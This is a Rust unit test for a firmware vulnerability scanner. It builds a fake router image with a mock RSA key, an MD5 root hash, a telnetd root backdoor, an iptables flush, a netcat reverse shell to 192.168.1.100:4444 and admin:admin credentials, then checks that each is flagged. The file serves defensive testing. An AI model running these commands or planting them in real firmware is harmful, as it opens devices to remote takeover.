// Licensed under the Apache License, Version 2.0 <LICENSE or
// http://www.apache.org/licenses/LICENSE-2.0>.
// Copyright 2026 GHSFS. See the NOTICE file for attribution details.

use firm_carver::vuln_scan::{scan_vulnerabilities, VulnCategory, VulnSeverity};

#[test]
fn test_vuln_scanner_detects_embedded_keys_and_backdoors() {
    let mut firmware_sample = Vec::new();

    // 1. Safe preamble
    firmware_sample
        .extend_from_slice(b"# Kernel initialization script\necho 'Booting IoT device...'\n");

    // 2. Embedded RSA private key
    firmware_sample.extend_from_slice(
        b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0mockkey...\n-----END RSA PRIVATE KEY-----\n",
    );

    // 3. Shadow file with MD5 root hash
    firmware_sample.extend_from_slice(b"root:$1$v6X8Zz1T$mockhash123456789:18000:0:99999:7:::\n");

    // 4. Insecure telnet root backdoor
    firmware_sample.extend_from_slice(b"/usr/sbin/telnetd -l /bin/sh -p 23 &\n");

    // 5. Firewall flush
    firmware_sample.extend_from_slice(b"iptables -F\n");

    // 6. Netcat reverse shell
    firmware_sample.extend_from_slice(b"nc -e /bin/sh 192.168.1.100 4444 &\n");

    // 7. Default credentials
    firmware_sample.extend_from_slice(b"DEFAULT_LOGIN=admin:admin\n");

    let report = scan_vulnerabilities(&firmware_sample, "router_firmware.bin");

    assert_eq!(report.target_file, "router_firmware.bin");
    assert_eq!(report.target_size, firmware_sample.len());
    assert!(report.total_findings >= 6);

    // Verify finding categories and severities
    let has_rsa_key = report
        .findings
        .iter()
        .any(|f| f.category == VulnCategory::PrivateKey && f.severity == VulnSeverity::Critical);
    assert!(has_rsa_key, "Expected critical RSA private key finding");

    let has_shadow_hash = report
        .findings
        .iter()
        .any(|f| f.category == VulnCategory::HardcodedCredential && f.id == "FCARV-SEC-030");
    assert!(
        has_shadow_hash,
        "Expected static MD5 root password hash finding"
    );

    let has_telnet_backdoor = report
        .findings
        .iter()
        .any(|f| f.category == VulnCategory::BackdoorCommand && f.id == "FCARV-SEC-010");
    assert!(
        has_telnet_backdoor,
        "Expected unauthenticated telnet shell finding"
    );

    let has_iptables_flush = report
        .findings
        .iter()
        .any(|f| f.category == VulnCategory::SecurityBypass && f.id == "FCARV-SEC-020");
    assert!(
        has_iptables_flush,
        "Expected iptables -F security bypass finding"
    );

    let has_nc_shell = report
        .findings
        .iter()
        .any(|f| f.category == VulnCategory::BackdoorCommand && f.id == "FCARV-SEC-050");
    assert!(has_nc_shell, "Expected netcat shell finding");

    let has_admin_default = report
        .findings
        .iter()
        .any(|f| f.category == VulnCategory::HardcodedCredential && f.id == "FCARV-SEC-040");
    assert!(has_admin_default, "Expected default admin:admin finding");

    // Verify JSON serialization round-trip
    let json_text = serde_json::to_string_pretty(&report).expect("JSON serialization failed");
    assert!(json_text.contains("FCARV-SEC-010"));
    assert!(json_text.contains("Critical"));
}
